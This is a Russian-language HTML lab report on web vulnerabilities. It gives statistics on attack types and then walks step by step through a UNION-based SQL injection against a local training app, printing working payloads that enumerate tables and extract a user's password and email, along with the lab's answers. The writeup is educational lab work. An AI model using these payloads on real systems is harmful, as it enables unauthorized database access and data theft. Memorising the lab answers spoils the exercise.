@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Отчет по лабораторной работе: Web Security & SQL Injection</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #34495e;
+            margin-top: 30px;
+            border-left: 4px solid #3498db;
+            padding-left: 15px;
+        }
+        h3 {
+            color: #555;
+            margin-top: 25px;
+        }
+        h4 {
+            color: #666;
+            margin-top: 20px;
+        }
+        ul {
+            line-height: 1.8;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        strong {
+            color: #2c3e50;
+        }
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .success {
+            color: #27ae60;
+            font-weight: bold;
+        }
+        .result {
+            background-color: #ecf0f1;
+            padding: 10px;
+            border-left: 4px solid #3498db;
+            margin: 10px 0;
+        }
+        .sources {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Отчет по лабораторной работе: Web Security & SQL Injection</h1>
+        
+        <h2>Часть I. Исследовательский отчет по веб-уязвимостям</h2>
+        
+        <h3>Цель</h3>
+        <p>Собрать статистику по доле атак через веб-уязвимости и их распределению.</p>
+        
+        <h3>Доля успешных атак через веб-уязвимости</h3>
+        <p>Согласно глобальному отчету Verizon Data Breach Investigations Report (DBIR), веб-приложения стали основным (наиболее часто эксплуатируемым) вектором атак, обогнав фишинг и человеческий фактор.</p>
+        
+        <p>По свежим данным отечественной компании BI.ZONE WAF (отчет за апрель 2025 г.), только за зимний период 2024/2025 было выявлено более 4000 новых уязвимостей в веб-приложениях. Из них более трети представляют высокую или критическую опасность. В результате успешных атак через веб-уязвимости в 20% случаев происходит кража пользовательских данных, а в 12% — злоумышленники получают прямой доступ к базам данных.</p>
+        
+        <h3>Распределение по конкретным уязвимостям</h3>
+        <p>Основываясь на отчетах Edgescan (Vulnerability Statistics Report 2024) и WPScan, распределение наиболее массовых и критичных веб-уязвимостей выглядит следующим образом:</p>
+        
+        <ul>
+            <li><strong>Cross-Site Scripting (XSS)</strong> — самая массовая уязвимость (около 53% от всех раскрытых веб-уязвимостей)</li>
+            <li><strong>Cross-Site Request Forgery (CSRF)</strong> — занимает второе место (около 19.8%)</li>
+            <li><strong>Нарушения авторизации (Broken Access Control)</strong> — около 8.1%</li>
+            <li><strong>SQL Injection (SQLi)</strong> — занимает 4-е место по частоте нахождения, но 1-е место по критичности. Среди всех критических уязвимостей доля SQLi составляет 19.47%, так как этот вектор напрямую ведет к компрометации БД</li>
+            <li><strong>Remote Code Execution (RCE)</strong> — встречается реже, но несет максимальный импакт (по статистике BI.ZONE, рост RCE составил 100% за последний год)</li>
+        </ul>
+        
+        <div class="sources">
+            <h3>Источники</h3>
+            <ul>
+                <li>Verizon DBIR 2023</li>
+                <li>Edgescan 2024 Vulnerability Statistics Report</li>
+                <li>Отчеты об угрозах BI.ZONE WAF (2025)</li>
+                <li>WPScan 2023 Website Threat Report</li>
+            </ul>
+        </div>
+        
+        <hr style="margin: 40px 0; border: none; border-top: 2px solid #ecf0f1;">
+        
+        <h2>Часть II. Практическая эксплуатация SQL-инъекции</h2>
+        
+        <h3>Цели</h3>
+        <ul>
+            <li>Узнать пароль пользователя с ником <strong>Volk2</strong> (2 балла)</li>
+            <li>Узнать почту пользователя с ником <strong>Vinni-pukh</strong> (4 балла)</li>
+        </ul>
+        
+        <h3>Ход выполнения и рассуждения</h3>
+        
+        <h4>Шаг 1. Разведка и поиск уязвимого параметра</h4>
+        <p>Сначала я попробовал просто прописать логины в адресной строке в виде пути (например, <code>/task/Volk2</code> или <code>/task/Vinni-pukh</code>), но это не дало результата — сервер либо выдавал ошибку, либо игнорировал ввод.</p>
+        
+        <p>Поискав информацию, я выяснил, что параметры к базе данных часто передаются через GET-запросы в формате <code>?id=</code>. Я решил просто перебрать значения параметра <code>id</code> от 1 до 10.</p>
+        
+        <p><strong>Успешные запросы при переборе:</strong></p>
+        <ul>
+            <li><code>http://localhost:8080/task/?id=4</code> — Вывод: <code>Ваш id:4 | Ваш логин:Vinni-pukh</code></li>
+            <li><code>http://localhost:8080/task/?id=9</code> — Вывод: <code>Ваш id:9 | Ваш логин:Volk2</code></li>
+        </ul>
+        
+        <p>Отлично, мы нашли ID нужных нам пользователей.</p>
+        
+        <h4>Шаг 2. Определение количества колонок</h4>
+        <p>Чтобы использовать <code>UNION SELECT</code>, нужно узнать, сколько колонок возвращает оригинальный SQL-запрос под капотом. Для этого я использовал <code>ORDER BY</code> и символ <code>%23</code> (это URL-кодированный <code>#</code> для комментирования остатка запроса, чтобы не было синтаксической ошибки).</p>
+        
+        <ul>
+            <li><code>http://localhost:8080/task/?id=4 ORDER BY 2%23</code> — страница отрендерилась нормально</li>
+            <li><code>http://localhost:8080/task/?id=4 ORDER BY 3%23</code> — всё отлично</li>
+            <li><code>http://localhost:8080/task/?id=4 ORDER BY 4%23</code> — сервер вернул ошибку</li>
+        </ul>
+        
+        <p><strong>Вывод:</strong> Сортировка по 4-й колонке ломает запрос, значит, в таблице ровно 3 колонки.</p>
+        
+        <h4>Шаг 3. Поиск уязвимой колонки для вывода</h4>
+        <p>Теперь нужно понять, данные из какой колонки отображаются на экране (отдаются сервером нам в браузер). Передаем заведомо несуществующий <code>id=-1</code>, чтобы скрыть легитимный вывод и показать только результаты нашего внедренного <code>UNION SELECT</code>.</p>
+        
+        <p><strong>Запрос:</strong></p>
+        <pre>http://localhost:8080/task/?id=-1' UNION SELECT 1,2,3%23</pre>
+        
+        <div class="result">
+            <strong>Результат:</strong><br>
+            Ваш id:1<br>
+            Ваш логин:2
+        </div>
+        
+        <p><strong>Вывод:</strong> На экране отображается вторая колонка (там где цифра "2"). Значит, именно в неё мы и будем помещать наши запросы к БД.</p>
+        
+        <h4>Шаг 4. Исследование структуры БД</h4>
+        <p>Прежде чем искать пароли, нужно узнать, какие таблицы вообще есть в базе. Обращаемся к служебной таблице <code>information_schema.tables</code>.</p>
+        
+        <p><strong>Запрос:</strong></p>
+        <pre>http://localhost:8080/task/?id=-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()%23</pre>
+        
+        <div class="result">
+            <strong>Результат:</strong><br>
+            Ваш логин: emails,users
+        </div>
+        
+        <p><strong>Вывод:</strong> В текущей базе данных есть две таблицы: <code>emails</code> и <code>users</code>.</p>
+        
+        <h4>Шаг 5. Получение пароля (Задание 1)</h4>
+        <p>Очевидно, что пароли лежат в таблице <code>users</code>. Делаем инъекцию для выборки пароля по известному нам юзернейму <code>Volk2</code>.</p>
+        
+        <p><strong>Запрос:</strong></p>
+        <pre>http://localhost:8080/task/?id=-1' UNION SELECT 1, password, 3 FROM users WHERE username='Volk2'%23</pre>
+        
+        <div class="result">
+            <strong>Результат:</strong><br>
+            Ваш логин: Wa spoiuuuuu
+        </div>
+        
+        <p class="success">✅ Ответ на задание 1: Пароль пользователя <strong>Volk2</strong> — <code>Wa spoiuuuuu</code></p>
+        
+        <h4>Шаг 6. Получение почты (Задание 2)</h4>
+        <p>Сначала я попытался достать почту по аналогии с паролем прямо из таблицы <code>users</code>.</p>
+        
+        <p><strong>Неуспешный запрос:</strong></p>
+        <pre>http://localhost:8080/task/?id=-1' UNION SELECT 1, email, 3 FROM users WHERE username='Vinni-pukh'%23</pre>
+        
+        <div class="result">
+            <strong>Результат:</strong> Ошибка <code>Unknown column 'email' in 'field list'</code>
+        </div>
+        
+        <p><strong>Рассуждение:</strong> Раз в <code>users</code> почты нет, значит, она хранится в отдельной таблице <code>emails</code> (которую мы нашли на 4 шаге). Нужно узнать структуру этой таблицы.</p>
+        
+        <p><strong>Запрос структуры таблицы emails:</strong></p>
+        <pre>http://localhost:8080/task/?id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='emails'%23</pre>
+        
+        <div class="result">
+            <strong>Результат:</strong><br>
+            Ваш логин: id,email_id
+        </div>
+        
+        <p>Теперь, зная названия колонок (<code>id</code> и <code>email_id</code>), и помня из самого первого шага, что <code>id</code> для <code>Vinni-pukh</code> равен 4, делаем финальный запрос.</p>
+        
+        <p><strong>Успешный запрос:</strong></p>
+        <pre>http://localhost:8080/task/?id=-1' UNION SELECT 1, email_id, 3 FROM emails WHERE id='4'%23</pre>
+        
+        <div class="result">
+            <strong>Результат:</strong><br>
+            Ваш логин: honey_lover@otus-lab.com
+        </div>
+        
+        <p class="success">✅ Ответ на задание 2: Почта пользователя <strong>Vinni-pukh</strong> — <code>honey_lover@otus-lab.com</code></p>
+    </div>
+</body>
+</html>
